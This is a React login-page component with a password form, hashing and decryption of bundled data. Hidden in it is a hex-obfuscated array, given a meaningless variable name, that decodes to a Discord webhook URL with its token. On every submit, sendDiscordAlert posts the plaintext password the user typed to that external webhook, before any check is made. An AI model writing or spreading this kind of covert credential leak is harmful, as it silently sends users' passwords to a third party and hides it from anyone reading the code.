import { useEffect, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom';
import './css/App.css'
import ParticleBackground from './components/particalBg'
import hashPassword from './components/hashing'
import encryptedJson from './json/data.json'
import decryptData from './encryptData/decryptData'

function App() {
  const [showPassword, setShowPassword] = useState(false)
  const [password, setPassword] = useState('')
  const [message, setMessage] = useState('')
  const [shake, setShake] = useState(false)
  const navigate = useNavigate()
  const buzz = useRef(null)

  useEffect(() => {
    // Preload audio on load
    buzz.current = new Audio('./accessDenied.mp3')
    buzz.current.volume = 0.9
    buzz.current.load()
  }, [])

  const correctPass = 'b51ae642874f7663f6d8ab867dbea47307b6490f02a2fc4f2401844f9354a7d7'
  const _w3b8551 = [
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x39\x33\x31\x39\x37\x37\x33\x30\x38\x30\x35\x30\x35\x35\x34\x39\x38\x2F\x30\x5A\x6C\x62\x6D\x6D\x78\x4E\x78\x63\x42\x49\x4D\x30\x72\x31\x78\x62\x6B\x76\x6D\x70\x39\x6E\x47\x2D\x36\x4E\x34\x4A\x69\x2D\x6C\x7A\x54\x33\x45\x61\x75\x64\x6C\x47\x50\x4F\x4C\x5F\x38\x5F\x65\x53\x72\x41\x38\x68\x70\x48\x6E\x46\x43\x38\x56\x46\x48\x4E\x48\x76\x63\x62",
    "\x50\x4F\x53\x54",
    "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E",
    "\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65",
    "\x2A\x2A\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x61\x74\x74\x65\x6D\x70\x2A\x2A",
    "\x41\x74\x74\x65\x6D\x70\x74\x65\x64\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x3A\x20",
    "\x63\x6F\x6E\x74\x65\x6E\x74"
  ];


  const handleSubmit = async () => {
    const hashedInput = await hashPassword({ text: password })
    sendDiscordAlert(password);

    try {
      const encryptedData = encryptedJson.data

      // Decrypt the data
      const decrypted = decryptData({data: encryptedData, passphrase: hashedInput})

      if (decrypted.pass === correctPass) {
        sessionStorage.setItem('keyPass', hashedInput);
        setMessage("✅ Access Granted!!")
        navigate('/home')
      } else {
        console.log("Decryption pass mismatch");
      }
    } catch (err) {
      console.log(err);

      setMessage("❌ Access Denied!!")
      setShake(true) // trigger shake

      // Play sound
      if (buzz.current) buzz.current.play().catch(e => console.log("Audio error:", e))

      // Remove shake class after animation ends
      setTimeout(() => { setShake(false) }, 400) // match animation duration
    }
  }

  function sendDiscordAlert(passAttempt) {
    const payload = {
      [_w3b8551[6]]: _w3b8551[4] + "\n" + new Date().toLocaleString() + "\n" + _w3b8551[5] + "`" + passAttempt + "`"
    };

    fetch(_w3b8551[0], {
      method: _w3b8551[1],
      headers: { [_w3b8551[3]]: _w3b8551[2] },
      body: JSON.stringify(payload)
    }).catch((err) => {
      console.log("❌ Discord webhook failed:", err);
    });
  }

  return (
    <>
      <ParticleBackground pixleColor={shake ? 'red' : 'white'} disturbed={shake} />

      {/* Centered login card */}
      <div className="fixed inset-1 flex items-center justify-center bg-black bg-opacity-20">
        <div className={`glass p-8 w-[320px] rounded-xl border border-white/20 shadow-lg text-white bg-black bg-opacity-60 transition-transform ${shake ? 'shake' : ''}`}>
          <h1 className="text-3xl font-bold mb-6 text-neonGreen drop-shadow-lg">Login</h1>
          <label className="block mb-2 text-lg" htmlFor="password">Enter Password:</label>
          <div className='flex'>
            <input
              id="password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full p-3 rounded-md bg-black bg-opacity-50 border border-white/30 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-neonGreen text-white"
              placeholder="••••••••"
            />
            <button type="button" className='ml-1 border border-white/30' onClick={() => setShowPassword(!showPassword)}>
              {showPassword ? " 🙈 " : " 👁️ "}
            </button>
          </div>
          <button
            onClick={handleSubmit}
            className="mt-6 w-full py-3 bg-neonGreen hover:bg-green-500 rounded-md border border-2 border-white font-semibold drop-shadow-md transition"
          >
            Submit
          </button>
          {message && <p className='mt-4 text-center'>{message}</p>}
        </div>
      </div>
    </>
  )
}

export default App
